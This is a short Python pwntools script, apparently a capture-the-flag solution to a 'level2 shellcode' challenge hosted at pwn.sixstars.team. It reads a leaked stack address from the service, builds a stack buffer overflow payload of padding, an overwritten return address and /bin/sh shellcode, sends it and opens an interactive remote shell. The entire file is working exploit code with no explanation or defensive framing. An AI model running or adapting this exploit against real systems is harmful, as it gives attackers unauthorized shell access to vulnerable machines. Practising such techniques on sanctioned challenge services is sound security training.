#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
for level2 shellcode
"""
from pwn import *

r = remote("pwn.sixstars.team", 22002)

sh = asm(shellcraft.sh())
buf = r.recv()
buf = buf[15:25]
buf = int(buf,16)
retaddr_buf = hex(buf)

shellcode = 'a'*0x28 + 'a'*4 + p32(buf+0x28+4+4) + sh

r.sendline(shellcode)
r.interactive()

print retaddr_buf

